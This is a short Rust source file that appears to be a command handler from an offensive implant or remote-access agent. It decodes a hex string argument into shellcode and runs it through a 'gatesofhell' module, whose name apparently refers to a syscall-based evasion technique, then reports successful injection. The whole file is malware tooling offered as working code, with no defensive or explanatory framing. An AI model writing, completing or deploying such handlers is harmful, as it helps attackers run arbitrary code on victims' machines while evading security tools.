use crate::gatesofhell;

pub fn handle_inject_sc(args: &[String]) -> Result<String, Box<dyn std::error::Error>> {
    if args.is_empty() {
        return Err("No shellcode provided".into());
    }
    
    let hex_shellcode = args[0].trim().trim_matches('"').trim_matches('\'');
    let shellcode = hex::decode(hex_shellcode)?;
    
    gatesofhell::execute_shellcode(&shellcode)?;
    Ok(format!("Shellcode injected successfully ({} bytes)", shellcode.len()))
}
